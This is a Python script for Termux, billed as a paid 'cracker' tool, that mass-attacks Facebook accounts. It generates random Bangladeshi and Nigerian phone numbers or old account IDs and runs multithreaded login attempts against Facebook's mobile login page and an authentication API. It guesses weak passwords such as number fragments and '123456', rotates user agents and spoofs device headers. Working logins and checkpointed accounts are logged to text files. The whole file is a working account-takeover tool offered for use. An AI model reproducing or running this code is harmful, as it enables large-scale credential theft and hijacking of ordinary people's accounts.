# DrunkCracker V1.0
# A tool from ToxicNoob Inc.

import random
import sys
import time
import os
import re
from bs4 import BeautifulSoup as bs
import requests
import concurrent.futures as cf

# user agents
useragent=["Mozilla/5.0 (Linux; Android 10; SM-A202F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850F Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.106 Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36 VivoBrowser/5.4.0", "Mozilla/5.0 (Linux; Android 4.4.2; SMART Start Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 5.1; NS5003 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0.1; ZB500KL Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36 YandexSearch/7.35 YandexSearchBrowser/7.35", "Mozilla/5.0 (Linux; Android 6.0.1; SM-T700 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.106 Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0.1; ASUS_X007D Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 YaBrowser/18.3.1.651.00 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.4.2; 9005X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Safari/537.36"]

#MakeNumberFile
def makefile(con):
    print("\n\033[37m[\033[92m*\033[37m] Creating File...")
    os.system("touch ok.txt > /dev/null 2>&1")
    os.system("touch cp.txt > /dev/null 2>&1")
    os.system("rm .combo.txt > /dev/null 2>&1")
    os.system("touch .combo.txt > /dev/null 2>&1")
    first = random.choice(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"])
    for i in range(100000):
        if (con == "bd"):
            combo = str(random.randint(0000000, 9999999))
            if (len(combo) < 7):
                continue
        elif (con == "ni"):
            combo = str(random.randint(000000, 999999))
            if (len(combo) < 6):
                continue
        elif (con == "uid1"):
            first = "100000"
            combo = str(random.randint(111111111, 999999999))
        elif (con == "uid2"):
            first = "10000"
            combo = str(random.randint(1111111111, 9999999999))
        
        file = open(".combo.txt", "a")
        file.write(first+combo + "\n")
        file.close()

# Show Started Massage
def started():
    if (crack_type =="bd"):
        print("\n\033[92m[\033[37m!\033[92m] Random BD Number Cracking Started!")
    elif (crack_type == "ni"):
        print("\n\033[92m[\033[37m!\033[92m] Random NG Number Cracking Started!")
    else:
        print("\n\033[92m[\033[37m!\033[92m] Random UID Cracking Started!")
    
    print("\033[92m[\033[37m!\033[92m] Please Wait While Account is being Cracked!")
    print("\033[92m[\033[37m!\033[92m] Turn on Airplane Mode for 5 Sec if no Result")
    print("\033[92m[\033[37m!\033[92m] Press \033[37m ctrl \033[92m+ \033[37mz \033[92mTo Exit!\n")


#Logo
def logo():
    os.system("clear")
    os.system("""echo "
      ▌ ▌       ▌  ▜    ▞▀▖         ▌
      ▙▄▌▌ ▌▛▚▀▖▛▀▖▐ ▞▀▖▌  ▙▀▖▝▀▖▞▀▖▌▗▘▞▀▖▙▀▖
      ▌ ▌▌ ▌▌▐ ▌▌ ▌▐ ▛▀ ▌ ▖▌  ▞▀▌▌ ▖▛▚ ▛▀ ▌
      ▘ ▘▝▀▘▘▝ ▘▀▀  ▘▝▀▘▝▀ ▘  ▝▀▘▝▀ ▘ ▘▝▀▘▘" | lolcat""")
    print("\n\033[92m   ╔═══════════════════════════════════════════╗")
    print("   ║➣ TOOL NAME : HumbleCracker                ║")
    print("   ║➣ AUTHOR    : HUMBLE CHRIS                 ║")
    print("   ║➣ WHATSAPP  : +2348028688667               ║")
    print("   ║➣ FACEBOOK  : facebook.com/100087376794068 ║")
    print("   ║➣ Github    : github.com/DRUNK01           ║")
    print("   ║➣ YOUTUBE   : [ CRX71 GAMING ]             ║")
    print("   ╚═══════════════════════════════════════════╝")

# Make new Key
def get_new_key(key_list):
    code = random.randint(00000, 99999)
    key = "Humble-Cracker@544e496e63"+str(code)+"^!"
    if (key in key_list):
        key = get_new_key(key_list)
    
    return key

# Check Approval Permission Of Tool
def check_permission():
    logo()
    print("\n\033[92m    DrunkCracker is Paid Tool. Checking Approval")
    # get approved key list
    k3y_list = requests.get("https://justpaste.it/ab453").text
    
    if not os.path.exists("/data/data/com.termux/files/usr/lib/k3y_dch.txt"):
        new_key = get_new_key(k3y_list)
        f = open("/data/data/com.termux/files/usr/lib/k3y_dch.txt", "w")
        f.write(new_key)
        f.close()
    
    k3y = open("/data/data/com.termux/files/usr/lib/k3y_dch.txt", "r").read()
    if (k3y == ""):
        new_key = get_new_key(k3y_list)
        f = open("/data/data/com.termux/files/usr/lib/k3y_dch.txt", "w")
        f.write(new_key)
        f.close()
    
    k3y = open("/data/data/com.termux/files/usr/lib/k3y_dch.txt", "r").read().replace("\n", "")
    
    if (k3y in k3y_list):
        print("\n\033[92m[\033[37m*\033[92m] Your Key is Approved!")
        time.sleep(0.5)
        return
    
    print("\n\033[37m[\033[91m!\033[37m] Your Key is Not Approved. You Need to Get Approval First!")
    print("\n\033[37m[\033[92m*\033[37m] Copy And Send Key To Admin")
    print("\n\033[37m[\033[92m*\033[37m] Your Key : " + k3y)
    print("\n\033[92m[\033[37m*\033[92m] Wait For Admin's Approval and Try Again Later!\033[37m\n")
    os.system(f"termux-open 'https://wa.me/+2348028688667?text=Dear Admin, Please Approved My Key To Premium Thanks My Name : My Key : {k3y}'")
    sys.exit()


# Random Number Cloning BD
def random_bd(formate):
    logo()
    print("\n\033[37m[\033[92m*\033[37m] Choose Your Option: ")
    
    print("\n\033[37m[\033[92m01\033[37m] Grammenphone")
    print("\033[37m[\033[92m02\033[37m] Banglalink")
    print("\033[37m[\033[92m03\033[37m] Robi")
    print("\033[37m[\033[92m04\033[37m] Airtel")
    print("\033[37m[\033[92m05\033[37m] Teletalk")
    
    inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    while not inp in ["1", "2", "3", "4", "5"]:
        print("\n\033[37m[\033[91m!\033[37m] Please Choose a Correct Option!")
        inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    global code
    
    if (inp == "1"):
        code = ["017", "013"]
    elif (inp == "2"):
        code = ["019", "014"]
    elif (inp == "3"):
        code = ["018"]
    elif (inp == "4"):
        code = ["016"]
    elif (inp == "5"):
        code = ["015"]
    
    #MakeNumberFile
    makefile("bd")
    
    number = open(".combo.txt", "r").readlines()
    
    global idz
    idz = len(number)
    logo()
    started()
    if (formate == "mbasic"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_mbasic, number)
            pool.shutdown(wait=True)
            time.sleep(1)
    elif (formate == "api"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_api, number)
            pool.shutdown(wait=True)
            time.sleep(0.2)

# Random Number Cloning Nigeria
def random_ni(formate):
    logo()
    print("\n\033[37m[\033[92m*\033[37m] Choose Your Option: ")
    
    print("\n\033[37m[\033[92m01\033[37m] MTN Nigeria")
    print("\033[37m[\033[92m02\033[37m] Glo")
    print("\033[37m[\033[92m03\033[37m] Airtel")
    print("\033[37m[\033[92m04\033[37m] 9Mobile")
    
    inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    while not inp in ["1", "2", "3", "4"]:
        print("\n\033[37m[\033[91m!\033[37m] Please Choose a Correct Option!")
        inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    global code
    
    if (inp == "1"):
        code = ["0803", "0806", "0810", "0813", "0814", "0816", "0703", "0706", "0903", "0906"]
    elif (inp == "2"):
        code = ["0705", "0805", "0807", "0811", "0815", "0905"]
    elif (inp == "3"):
        code = ["0701", "0708", "0802", "0808", "0812", "0902", "0907", "0901"]
    elif (inp == "4"):
        code = ["0809", "0817", "0818", "0908", "0909"]
    
    #MakeNumberFile
    makefile("ni")
    
    number = open(".combo.txt", "r").readlines()
    
    global idz
    idz = len(number)
    logo()
    started()
    if (formate == "mbasic"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_mbasic, number)
            pool.shutdown(wait=True)
            time.sleep(1)
    elif (formate == "api"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_api, number)
            pool.shutdown(wait=True)
            time.sleep(0.2)

# Random uid cloning
def random_uid(formate):
    logo()
    print("\n\033[37m[\033[92m*\033[37m] Choose Your Option: ")
    
    print("\n\033[37m[\033[92m01\033[37m] 2009-2010 IDz")
    print("\033[37m[\033[92m02\033[37m] 2011-2014 IDz")
    
    inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    while not inp in ["1", "2"]:
        print("\n\033[37m[\033[91m!\033[37m] Please Choose a Correct Option!")
        inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    
    if (inp == "1"):
        makefile("uid1")
    elif (inp == "2"):
        makefile("uid2")
   
    number = open(".combo.txt", "r").readlines()
    
    global idz
    idz = len(number)
    
    logo()
    started()
    
    if (formate == "mbasic"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_mbasic, number)
            pool.shutdown(wait=True)
            time.sleep(1)
    elif (formate == "api"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_api, number)
            pool.shutdown(wait=True)
            time.sleep(0.2)


# Main Process
done = 0
def process_mbasic(uname):
    global done
    done += 1
    
    if (crack_type == "bd"):
        username = str(random.choice(code)) + str(uname).replace("\n", "")
        passwords = [username[:8], username[:7], username[5:], "123456"]
        username =  "+88" + str(random.choice(code)) + str(uname).replace("\n", "")
        
    elif (crack_type == "ni"):
        username =  str(random.choice(code)) + str(uname).replace("\n", "")
        passwords = [username[:8], username[:7], username[5:], "123456"]
        username =  "+234" + str(random.choice(code)) + str(uname).replace("\n", "")
        
    elif (crack_type == "uid"):
        username = uname
        passwords = ["123456"]
    
    sys.stdout.write("\r\033[37m[\033[92m#\033[37m] Process Running [ \033[92m"+str(done)+" \033[37m/\033[92m "+str(idz)+" \033[37m]")
    
    url = "https://mbasic.facebook.com/login.php"
    ua = random.choice(useragent)
    
    headers={
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'host': 'mbasic.facebook.com',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua}
    
    for password in passwords:
        req=requests.Session()
        with req.get(url[0:27], headers=headers) as bido:
            view=bs(bido.text, 'html.parser')
            lsd=view.find('input', {'name':'lsd'})['value']
            jazoest=view.find('input', {'name':'jazoest'})['value']
            m_ts=view.find('input', {'name':'m_ts'})['value']
            li=view.find('input', {'name':'li'})['value']
            try_number=view.find('input', {'name':'try_number'})['value']
            unrecognized_tries=view.find('input', {'name':'unrecognized_tries'})['value']
            bi_xrwh=view.find('input', {'name':'bi_xrwh'})['value']
    
            payload={'lsd':lsd, 'jazoest':jazoest, 'm_ts':m_ts, 'li':li, 'try_number':try_number, 'unrecognized_tries':unrecognized_tries, 'email':username, 'pass':password, 'login':'submit', 'bi_xrwh':bi_xrwh}
        
            resp=req.post(url, data=payload, headers=headers, allow_redirects=True, timeout=60)
        
            result = str(resp.content)
                
            if 'facebook-এ "শুধুমাত্র টেক্সট" ব্যবহার করুন' in result or 'save-device' in result or 'zero/optin/write/?action=confirm&page=dialtone_optin_page' in result or '/zero/optin/write/?action=cancel&page=dialtone_optin_page' in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
                    
            elif "Help us confirm your name" in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
                
            elif 'mbasic_logout_button' in result or "Do you have a new mobile number?" in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
        
            elif "Check the login details shown. Was it you?" in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
                
            elif 'facebook.com/secure_account_learn_more/?uid' in result or 'Login approval needed' in result:
                print(f"\r\033[91m[ CP: {username} || {password} ]\033[37m")
                open('cp.txt','a').write(f'{username} || {password}\n')
                break
                
            elif 'disabled_checkpoint' in result:
                print(f"\r\033[91m[ CP: {username} || {password} ]\033[37m")
                open('cp.txt','a').write(f'{username} || {password}\n')
                break
                
            elif '/x/checkpoint/828281030927956' in result:
                print(f"\r\033[91m[ CP: {username} || {password} ]\033[37m")
                open('cp.txt','a').write(f'{username} || {password}\n')
                break
                
            elif '<title>error</title>' in result.lower() in result.lower():
                open("blocked.html","w").write(result)
                break
            
            else:
                open("tmp.html", "w").write(result)


# Process with fast api
done = 0
def process_api(uname):
    global done
    done += 1
    
    if (crack_type == "bd"):
        username = str(random.choice(code)) + str(uname).replace("\n", "")
        passwords = [username[:8], username[:7], username[5:], "123456"]
        username =  "%2B88" + str(random.choice(code)) + str(uname).replace("\n", "")
        
    elif (crack_type == "ni"):
        username =  str(random.choice(code)) + str(uname).replace("\n", "")
        passwords = [username[:8], username[:7], username[5:], "123456"]
        username =  "%2B234" + str(random.choice(code)) + str(uname).replace("\n", "")
        
    elif (crack_type == "uid"):
        username = uname.replace("\n", "")
        passwords = ["123456"]
    
    sys.stdout.write("\r\033[37m[\033[92m#\033[37m] Process Running [ \033[92m"+str(done)+" \033[37m/\033[92m "+str(idz)+" \033[37m]")
    
    for password in passwords:
        ua = random.choice(useragent)
        ses = requests.Session()
        headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"
        }
        result = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+username+"&password="+password+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
        if "session_key" in result.text and "EAAA" in result.text:
            print(f"\r\033[92m[ OK: {username.replace('%2B', '+')} || {password} ]\033[37m")
            open('ok.txt','a').write(f'{username.replace("%2B", "+")} || {password}\n')
            break
            
        elif "www.facebook.com" in result.json()["error_msg"]:
            print(f"\r\033[91m[ CP: {username.replace('%2B', '+')} || {password} ]\033[37m")
            open('cp.txt','a').write(f'{username.replace("%2B", "+")} || {password}\n')
            #open("cp.html", "w").write(result.text)
            break
            
        else:
            open("tmp.html", "w").write(result.text)


def main():
    logo()
    print("\n\033[37m[\033[92m*\033[37m] Choose Your Option: ")
    
    print("\n\033[37m[\033[92m01\033[37m] Bangladeshi Account Cracking \033[92m(\033[37mSlow\033[92m)\033[37m")
    print("\033[37m[\033[92m02\033[37m] Bangladeshi Account Cracking \033[92m(\033[37mFast\033[92m)\033[37m")
    print("\033[37m[\033[92m03\033[37m] Nigerian Account Cracking \033[92m(\033[37mSlow\033[92m)\033[37m")
    print("\033[37m[\033[92m04\033[37m] Nigerian Account Cracking \033[92m(\033[37mFast\033[92m)\033[37m")
    print("\033[37m[\033[92m05\033[37m] Random UID Cracking \033[92m(\033[37mSlow\033[92m)\033[37m")
    print("\033[37m[\033[92m06\033[37m] Random UID Cracking \033[92m(\033[37mFast\033[92m)\033[37m")
    print("\033[37m[\033[92m07\033[37m] Exit")
    
    inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    while not inp in ["1", "2", "3", "4", "5", "6", "7"]:
        print("\n\033[37m[\033[91m!\033[37m] Please Choose a Correct Option!")
        inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    global crack_type
    
    if (inp == "1"):
        crack_type = "bd"
        random_bd("mbasic")
    elif (inp == "2"):
        crack_type = "bd"
        random_bd("api")
    elif (inp == "3"):
        crack_type = "ni"
        random_ni("mbasic")
    elif (inp == "4"):
        crack_type = "ni"
        random_ni("api")
    elif (inp == "5"):
        crack_type = "uid"
        random_uid("mbasic")
    elif (inp == "6"):
        crack_type = "uid"
        random_uid("api")
    elif (inp == "7"):
        sys.exit("\033[37m")



if (__name__ == "__main__"):
    check_permission()
    main()


